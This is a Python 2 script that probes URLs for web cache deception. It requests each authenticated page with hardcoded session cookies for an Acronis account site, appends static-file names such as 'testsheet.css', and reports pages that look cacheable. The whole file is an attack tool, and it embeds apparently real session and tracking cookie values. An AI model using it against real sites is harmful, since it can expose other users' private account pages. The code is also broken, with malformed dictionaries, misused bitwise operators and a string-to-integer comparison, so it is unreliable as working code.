import requests
import sys

headers = {""User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://account.acronis.com/?new_user=2", "Content-Type": "application/json;charset=utf-8", "Origin": "https://account.acronis.com", "Connection": "close""}
cookies = {"_"cto_lwid": "3118eb23-7068-4935-9e46-c881ee69b69a", "_ga": "GA1.2.354607094.1573886872", "_fbp": "fb.1.1573886872800.1532376794", "optimizelyEndUserId": "oeu1573886874446r0.20067930007606904", "cto_bundle": "O8Vd_F9tWHpUMEJwdEpIdUpqaEoyTFpHdWFMTFZxUlA0MWd2ZyUyQkloNEQwUyUyRjdXbEQyQ2VaYU5NUm5Zb0MlMkY3U3pCSFU2cmt3cDhTV01Bc0ROUHBXVXdaRE9jSUplQlAzRlJjQWNiVHFlSiUyQlg4akd4ZkxQVG1ydU5lN2hSdiUyQm92V0JZVm5oYkNVVkpIbEhKeWp3bEFqR2tFYlh3JTNEJTNE", "_mkto_trk": "id:929-HVV-335&token:_mch-acronis.com-1573886879467-71773", "_hjid": "8d35ba26-b487-4b5e-9bd2-5fed68761d2c", "_gd_visitor": "bf2a1cd9-7fc3-4615-8897-b237077addea", "_gd_svisitor": "45460317b1300000b71acf5d5402000042330000", "_gcl_au": "1.1.704333341.1581843974", "ADC": "9ShctYq7tuOQzT0UCaY8ltKnXR6TjhuuHqS83Kk14WA.buiAUQ.MTQzNjY1NTA5NA", "scarab.visitor": "%22ABA5638583FC338%22", "_gid": "GA1.2.563483682.1581966937", "_gd_session": "0e499ff0-dc2a-4cb7-8077-9bea997333df", "_hjIncludedInSample": "1""}

short_extensions = ['css','png','jpg','gif','txt','js','swf','bmp']
large_extensions = ['aif','aiff','css','au','avi','bin','bmp','cab','carb','cct','cdf','class','css','doc',' dcr',' dtd',' gcf',' gff',' gif',' grv',' hdml',' hqx',' ico',' ini',' jpeg',' jpg',' js',' mov',' mp3',' nc',' pct',' ppc',' pws',' swa',' swf',' txt',' vbs',' w32',' wav',' wbmp',' wml',' wmlc',' wmls',' wmlsc',' xsd',' zip']

auth = requests.Session()
results=[]
possible_result=[]
urls = sys.argv[1]
try:
	with open(urls,'r') as f:
		for j in f.readlines():
			j=j.strip('\n')
			j=j.strip('\r')
			url = j 
			#print url
			unsession = requests.get(url)
			session = auth.get(url, headers=headers, cookies=cookies)
			print '\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
			print '[+] Authenticated Detail [+]  '+'\n'
			print 'URL : '+session.url
			print 'Status Code : '+str(session.status_code)
			print 'Content Length: '+str(len(session.content))
			print '\n'
			print '[+] UnAuthenticated Details [+]  '+'\n'
			print 'URL : '+unsession.url
			print 'Status Code : '+str(unsession.status_code)
			print 'Content Length : '+str(len(unsession.content))+'\n'
			print '\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
			if unsession.history:
				for resp in unsession.history:
					print 'Redirected From : '+resp.url
					print 'With Status Code : '+str(resp.status_code)
					print '\n'
				print '\n~~~~~ATTACK~~~~~\n'
			for i in short_extensions:
				i = i.strip('\n')
				i = i.strip('\r')
				i = 'testsheet.'+i
				newurl=url+i
				newsession = auth.get(newurl, headers=headers, cookies=cookies)
				print 'Trying ... -> '+str(newurl)+'\n'
				conditionContent = str(len(newsession.content)+100) # To Avoid False Positivie

				#print conditionContent
				if len(newsession.content) == len(session.content) | (newsession.status_code) == (session.status_code):
					print '100% Cache at : '+newurl+str(newsession.status_code)+', Length:'+str(len(newsession.content))+'\n'
					results.append(newurl)
				elif len(session.content) > len(newsession.content) & (newsession.status_code) == (session.status_code):
					if conditionContent >= len(session.content):
						print 'Possible Cache at : '+newurl+str(newsession.status_code)+', Length:'+str(len(newsession.content))+'\n'
						possible_result.append(newurl)
				else:
					print 'Not Possible , Status code : '+str(newsession.status_code)+', Length:'+str(len(newsession.content))+'\n'

except KeyboardInterrupt as e:
	print 'Error occured : '+str(e)+'\n'
	pass

print '[+] Results '+str(len(results))+'\n'
print results

print '[+] Possible Results '+str(len(possible_result))+'\n'
print possible_result
